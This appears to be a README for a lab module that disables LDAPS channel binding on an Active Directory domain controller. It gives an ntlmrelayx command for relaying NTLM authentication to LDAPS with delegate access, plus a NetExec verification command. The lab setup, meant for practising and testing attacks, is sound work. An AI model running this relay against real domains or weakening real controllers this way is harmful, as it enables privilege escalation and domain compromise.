# ldap-cbt-off

DC does not enforce LDAPS channel binding. Sets `ldap.channel_binding` to `never` on a domain controller (default: the root DC).

Attack:

Relay NTLM authentication to LDAPS on the DC:

    ntlmrelayx.py -t ldaps://<dc ip> --delegate-access

How to verify:

    nxc ldap <dc ip> -u <user> -p 'Aa1234567890!' -M ldap-checker   # channel binding NEVER when enabled

Disable restores the value declared for the host in the lab's `base_settings`.
